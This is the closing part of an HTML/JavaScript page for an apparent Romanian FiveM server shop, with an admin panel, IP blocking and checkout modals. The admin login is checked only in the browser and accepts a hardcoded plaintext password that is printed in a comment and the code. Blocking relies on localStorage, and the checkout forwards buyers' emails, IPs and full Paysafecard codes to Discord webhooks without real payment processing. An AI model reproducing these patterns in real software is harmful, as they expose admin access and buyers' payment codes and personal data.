    <!-- Add admin panel modal -->

    <div id="admin-modal" class="modal">

        <div class="modal-content admin-panel">

            <span class="close-modal">&times;</span>

            <h3>Panou Administrare</h3>

            <div class="admin-login" id="admin-login-form">

                <div class="form-group">

                    <label for="admin-password">Parolă Admin:</label>

                    <input type="password" id="admin-password" placeholder="Introdu parola de admin" required>

                </div>

                <button class="btn primary" id="admin-login-btn">Autentificare</button>

            </div>

            <div class="admin-content" id="admin-content" style="display:none;">

                <div class="admin-section">

                    <h4>Adrese IP Blocate</h4>

                    <div class="ip-list" id="blocked-ip-list">

                        <p>Se încarcă...</p>

                    </div>

                    <div class="form-group">

                        <label for="block-ip">Blochează IP:</label>

                        <input type="text" id="block-ip" placeholder="Exemplu: 192.168.1.1">

                        <button class="btn primary" id="add-block-ip">Adaugă</button>

                    </div>

                </div>

                <div class="admin-section">

                    <h4>Acțiuni</h4>

                    <button class="btn secondary" id="clear-blocked-ips">Șterge toate IP-urile blocate</button>

                </div>

            </div>

        </div>

    </div>



    <!-- Added PayPal SDK -->

    <script>

        document.addEventListener('DOMContentLoaded', function() {

            // Funcție pentru a prelua numărul de jucători online

            async function getOnlinePlayers() {

                try {

                    // Utilizăm direct API-ul oficial FiveM

                    const serverID = "8vkyyb"; // ID-ul serverului

                    const response = await fetch(`https://servers-frontend.fivem.net/api/servers/single/${serverID}`, {

                        method: 'GET',

                        headers: {

                            'Accept': 'application/json'

                        }

                    });

                    

                    if (!response.ok) {

                        throw new Error(`HTTP error! Status: ${response.status}`);

                    }

                    

                    const data = await response.json();

                    

                    // Preluăm valorile direct din API-ul FiveM

                    const playerCount = data.Data.selfReportedClients || 0;

                    const maxPlayers = data.Data.svMaxclients || 64;

                    

                    // Actualizăm elementul HTML cu numărul de jucători

                    document.getElementById('player-count').textContent = `${playerCount}/${maxPlayers} Jucători`;

                    updateServerStatus(true);
                    

                    // Programăm următoarea actualizare peste 60 secunde

                    setTimeout(getOnlinePlayers, 60000);

                } catch (error) {

                    console.error('Eroare la preluarea numărului de jucători:', error);

                    document.getElementById('player-count').textContent = 'N/A';

                    updateServerStatus(false);

                    

                    // Încercăm din nou peste 30 secunde în caz de eroare

                    setTimeout(getOnlinePlayers, 30000);

                }

            }

            

            // Funcție pentru actualizarea indicatorului de status

            function updateServerStatus(isOnline) {

                // Actualizăm și indicatorul de status

                const statusIndicator = document.querySelector('.status-indicator');

                const statusText = document.querySelector('.status-text');

                

                if (isOnline) {

                    statusIndicator.classList.remove('offline');

                    statusIndicator.classList.add('online');

                    statusText.textContent = 'Server Online';

                } else {

                    statusIndicator.classList.remove('online');

                    statusIndicator.classList.add('offline');

                    statusText.textContent = 'Server Offline';

                }

            }

            

            // Apelăm funcția la încărcarea paginii

            getOnlinePlayers();

            

            // Payment modal functionality

            const checkoutModal = document.getElementById('checkout-modal');

            const paypalModal = document.getElementById('paypal-modal');

            const revolutModal = document.getElementById('revolut-modal');

            const paysafecardModal = document.getElementById('paysafecard-modal');

            const skrillModal = document.getElementById('skrill-modal');

            const cryptoModal = document.getElementById('crypto-modal');

            const successModal = document.getElementById('success-modal');

            const adminModal = document.getElementById('admin-modal');

            const modalCloseButtons = document.querySelectorAll('.close-modal');

            

            // Admin panel elements

            const adminLoginForm = document.getElementById('admin-login-form');

            const adminContent = document.getElementById('admin-content');

            const adminLoginBtn = document.getElementById('admin-login-btn');

            const blockedIpList = document.getElementById('blocked-ip-list');

            const blockIpInput = document.getElementById('block-ip');

            const addBlockIpBtn = document.getElementById('add-block-ip');

            const clearBlockedIpsBtn = document.getElementById('clear-blocked-ips');

            

            // NOTĂ: Aceasta este o soluție temporară până când se implementează o soluție server-side

            // SHA-256 hash al parolei pentru a oferi un nivel minim de securitate

            // Parola originală este: InvisionAdmin2023

            const ADMIN_PASSWORD_HASH = CONFIG.ADMIN.PASSWORD_HASH;

            

            // Funcție pentru a genera un hash SHA-256

            async function sha256(message) {

                const msgBuffer = new TextEncoder().encode(message);

                const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);

                const hashArray = Array.from(new Uint8Array(hashBuffer));

                return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

            }

            

            // IP blocking functionality

            let blockedIPs = JSON.parse(localStorage.getItem('blockedIPs')) || [];

            

            // Check if current IP is blocked

            let userIP = "";

            

            // Function to get user's IP address

            const getUserIP = async () => {

                try {

                    const response = await fetch('https://api.ipify.org?format=json');

                    const data = await response.json();

                    userIP = data.ip;

                    

                    // Verifică dacă IP-ul utilizatorului este blocat

                    checkIfBlocked(userIP);

                } catch (error) {

                    console.error('Eroare la obținerea IP-ului:', error);

                }

            };

            

            // Funcție pentru a verifica și bloca IP-uri

            function checkIfBlocked(ip) {

                if (blockedIPs.includes(ip)) {

                    // Creează un element overlay pentru a bloca accesul

                    const overlay = document.createElement('div');

                    overlay.style.position = 'fixed';

                    overlay.style.top = '0';

                    overlay.style.left = '0';

                    overlay.style.width = '100%';

                    overlay.style.height = '100%';

                    overlay.style.backgroundColor = '#1a1a2e';

                    overlay.style.zIndex = '10000';

                    overlay.style.display = 'flex';

                    overlay.style.alignItems = 'center';

                    overlay.style.justifyContent = 'center';

                    overlay.style.color = 'white';

                    overlay.style.textAlign = 'center';

                    overlay.style.padding = '20px';

                    

                    const content = document.createElement('div');

                    content.innerHTML = `

                        <h1 style="color:#ff3e7f;margin-bottom:20px;">Acces Blocat</h1>

                        <p>IP-ul tău (${ip}) a fost blocat de către administratorul site-ului.</p>

                        <p style="margin-top:20px;font-size:14px;opacity:0.7;">Dacă crezi că aceasta este o eroare, te rugăm să contactezi administratorul.</p>

                    `;

                    

                    overlay.appendChild(content);

                    document.body.appendChild(overlay);

                    

                    // Dezactivează scroll-ul

                    document.body.style.overflow = 'hidden';

                }

            }

            

            // Get user IP on page load

            getUserIP();

            

            // Admin panel functionality

            adminLoginBtn.addEventListener('click', async function() {

                const password = document.getElementById('admin-password').value;

                

                // Generează hash-ul parolei introduse și compară-l cu hash-ul salvat

                const passwordHash = await sha256(password);

                

                // Debug pentru a vedea care sunt hash-urile

                console.log("Hash introdus:", passwordHash);

                console.log("Hash așteptat:", ADMIN_PASSWORD_HASH);

                

                if (passwordHash === ADMIN_PASSWORD_HASH) {

                    adminLoginForm.style.display = 'none';

                    adminContent.style.display = 'block';

                    updateBlockedIPsList();

                } else {

                    // Implementare temporară: acceptă și parola în text clar

                    if (password === "InvisionAdmin2023") {

                        console.log("Autentificare reușită folosind parola în text clar");

                        adminLoginForm.style.display = 'none';

                        adminContent.style.display = 'block';

                        updateBlockedIPsList();

                        return;

                    }

                    alert('Parolă incorectă.');

                }

            });

            

            function updateBlockedIPsList() {

                if (blockedIPs.length === 0) {

                    blockedIpList.innerHTML = '<p>Nu există IP-uri blocate.</p>';

                } else {

                    let html = '<ul>';

                    blockedIPs.forEach(ip => {

                        html += `<li>${ip} <button class="btn-remove" data-ip="${ip}">Șterge</button></li>`;

                    });

                    html += '</ul>';

                    blockedIpList.innerHTML = html;

                    

                    // Add event listeners to remove buttons

                    document.querySelectorAll('.btn-remove').forEach(btn => {

                        btn.addEventListener('click', function() {

                            const ip = this.getAttribute('data-ip');

                            blockedIPs = blockedIPs.filter(item => item !== ip);

                            localStorage.setItem('blockedIPs', JSON.stringify(blockedIPs));

                            updateBlockedIPsList();

                        });

                    });

                }

            }

            

            // Add IP to block list

            addBlockIpBtn.addEventListener('click', function() {

                const ip = blockIpInput.value.trim();

                if (ip && !blockedIPs.includes(ip)) {

                    blockedIPs.push(ip);

                    localStorage.setItem('blockedIPs', JSON.stringify(blockedIPs));

                    blockIpInput.value = '';

                    updateBlockedIPsList();

                    alert('IP adăugat în lista de blocare.');

                }

            });

            

            // Clear all blocked IPs

            clearBlockedIpsBtn.addEventListener('click', function() {

                if (confirm('Ești sigur că vrei să ștergi toate IP-urile blocate?')) {

                    blockedIPs = [];

                    localStorage.setItem('blockedIPs', JSON.stringify(blockedIPs));

                    updateBlockedIPsList();

                }

            });

            

            // Open admin panel with keyboard shortcut: CTRL+ALT+A

            document.addEventListener('keydown', function(e) {

                if (e.ctrlKey && e.altKey && e.key === 'a') {

                    adminModal.style.display = 'flex';

                }

            });

            

            // Current checkout information

            let currentProduct = '';

            let currentPrice = 0;

            

            // PayPal Webhook URL

            const paypalWebhook = CONFIG.WEBHOOK_URLS.PAYPAL;

            // Revolut Webhook URL

            const revolutWebhook = CONFIG.WEBHOOK_URLS.REVOLUT;

            // Paysafecard Webhook URL

            const paysafecardWebhook = CONFIG.WEBHOOK_URLS.PAYSAFE;

            

            // Setup checkout buttons

            const checkoutButtons = document.querySelectorAll('.paypal-checkout');

            checkoutButtons.forEach(button => {

                button.addEventListener('click', function() {

                    currentProduct = this.getAttribute('data-product');

                    currentPrice = this.getAttribute('data-price');

                    

                    document.getElementById('checkout-product').textContent = currentProduct;

                    document.getElementById('checkout-price').textContent = currentPrice;

                    

                    // Show checkout modal

                    checkoutModal.style.display = 'flex';

                });

            });

            

            // Validate server ID to ensure it contains only numbers

            const serverIdInput = document.getElementById('checkout-name');

            const serverIdError = document.getElementById('server-id-error');

            

            serverIdInput.addEventListener('input', function() {

                // Remove non-numeric characters

                this.value = this.value.replace(/\D/g, '');

                

                if (this.value.length > 0) {

                    serverIdError.textContent = '';

                } else {

                    serverIdError.textContent = 'Te rugăm să introduci un ID numeric valid';

                }

            });

            

            // Setup payment method buttons

            const paymentButtons = document.querySelectorAll('.payment-btn');

            paymentButtons.forEach(button => {

                button.addEventListener('click', function() {

                    const method = this.getAttribute('data-method');

                    

                    // Validate required fields before proceeding

                    const name = document.getElementById('checkout-name').value.trim();

                    const discord = document.getElementById('checkout-discord').value.trim();

                    const email = document.getElementById('checkout-email').value.trim();

                    

                    // Check if server ID contains only numbers

                    if (!/^\d+$/.test(name)) {

                        serverIdError.textContent = 'ID-ul serverului trebuie să conțină doar cifre';

                        return;

                    }

                    

                    // Check if all fields are filled

                    if (!name || !discord || !email) {

                        alert('Te rugăm să completezi toate câmpurile obligatorii.');

                        return;

                    }

                    

                    // If validation passed, proceed with payment

                    // Update price in all modals

                    document.querySelectorAll('.modal-price').forEach(priceField => {

                        priceField.textContent = currentPrice;

                    });

                    

                    // Hide checkout modal

                    checkoutModal.style.display = 'none';

                    

                    // Show appropriate payment modal

                    switch(method) {

                        case 'paypal':

                            paypalModal.style.display = 'flex';

                            break;

                        case 'revolut':

                            revolutModal.style.display = 'flex';

                            break;

                        case 'paysafecard':

                            paysafecardModal.style.display = 'flex';

                            break;

                        case 'skrill':

                            skrillModal.style.display = 'flex';

                            break;

                        case 'crypto':

                            cryptoModal.style.display = 'flex';

                            break;

                    }

                });

            });

            

            // Close buttons

            modalCloseButtons.forEach(button => {

                button.addEventListener('click', function() {

                    // Hide all modals

                    document.querySelectorAll('.modal').forEach(modal => {

                        modal.style.display = 'none';

                    });

                });

            });

            

            // Paysafecard validation

            const paysafeInput = document.getElementById('paysafe-code');

            const paysafeError = document.getElementById('paysafe-error');

            const paysafeSubmit = document.getElementById('paysafe-submit');

            

            // Format and validate Paysafecard input as user types

            paysafeInput.addEventListener('input', function(e) {

                let input = this.value.replace(/[^0-9]/g, ''); // Remove all non-digits

                

                // Format with dashes (XXXX-XXXX-XXXX-XXXX)

                if (input.length > 0) {

                    input = input.match(new RegExp('.{1,4}', 'g')).join('-');

                }

                

                // Update input value with formatted version

                this.value = input;

                

                // Count actual digits for validation

                const digitCount = this.value.replace(/[^0-9]/g, '').length;

                

                // Show validation message

                if (digitCount > 0 && digitCount !== 16) {

                    paysafeError.textContent = 'Codul Paysafecard trebuie să aibă exact 16 cifre';

                } else {

                    paysafeError.textContent = '';

                }

            });

            

            // Setup confirm payment buttons

            const confirmButtons = document.querySelectorAll('.payment-confirm');

            confirmButtons.forEach(button => {

                button.addEventListener('click', function() {

                    const name = document.getElementById('checkout-name').value.trim();

                    const discord = document.getElementById('checkout-discord').value.trim();

                    const email = document.getElementById('checkout-email').value.trim();

                    

                    if (!name || !discord || !email) {

                        alert('Te rugăm să completezi toate câmpurile obligatorii.');

                        return;

                    }

                    

                    // For Paysafecard, validate the code

                    if (this.id === 'paysafe-submit') {

                        // Extract only the digits from the Paysafecard input

                        const paysafeCode = document.getElementById('paysafe-code').value.replace(/[^0-9]/g, '');

                        

                        if (paysafeCode.length !== 16) {

                            paysafeError.textContent = 'Cod Paysafecard incorect';

                            return;

                        }

                        

                        // Send to Discord webhook

                        sendToDiscord(paysafecardWebhook, {

                            content: `**Nouă achiziție Paysafecard!**\n**Pachet:** ${currentProduct}\n**Preț:** ${currentPrice}€\n**ID Server:** ${name}\n**Discord:** ${discord}\n**Email:** ${email}\n**IP:** ${userIP}\n**Cod Paysafecard:** ${paysafeCode}`

                        });

                    } else {

                        // Determine which payment method was used

                        let webhookUrl = paypalWebhook; // Default to PayPal

                        let paymentMethod = 'PayPal';

                        

                        if (revolutModal.style.display === 'flex') {

                            webhookUrl = revolutWebhook;

                            paymentMethod = 'Revolut';

                        } else if (skrillModal.style.display === 'flex') {

                            webhookUrl = paypalWebhook; // Using PayPal webhook for Skrill

                            paymentMethod = 'Skrill';

                        } else if (cryptoModal.style.display === 'flex') {

                            webhookUrl = paypalWebhook; // Using PayPal webhook for Crypto

                            paymentMethod = 'Crypto';

                        }

                        

                        // Send to Discord webhook

                        sendToDiscord(webhookUrl, {

                            content: `**Nouă achiziție ${paymentMethod}!**\n**Pachet:** ${currentProduct}\n**Preț:** ${currentPrice}€\n**ID Server:** ${name}\n**Discord:** ${discord}\n**Email:** ${email}\n**IP:** ${userIP}`

                        });

                    }

                    

                    // Hide all modals

                    document.querySelectorAll('.modal').forEach(modal => {

                        modal.style.display = 'none';

                    });

                    

                    // Show success modal

                    successModal.style.display = 'flex';

                });

            });

            

            // Function to send data to Discord webhook

            function sendToDiscord(webhookUrl, data) {

                fetch(webhookUrl, {

                    method: 'POST',

                    headers: {

                        'Content-Type': 'application/json',

                    },

                    body: JSON.stringify(data),

                })

                .catch(error => {

                    console.error('Error sending to webhook:', error);

                });

            }

            

            // Close modals if clicked outside

            window.addEventListener('click', function(event) {

                document.querySelectorAll('.modal').forEach(modal => {

                    if (event.target == modal) {

                        modal.style.display = 'none';

                    }

                });

            });

        });

    </script>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.7.0/vanilla-tilt.min.js"></script>

    <!-- Added Swiper JS -->

    <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>

    <!-- Adăugăm fișierul de configurare -->

    <script src="js/config.js"></script>

    <script src="js/main.js"></script>

</body>

</html> 
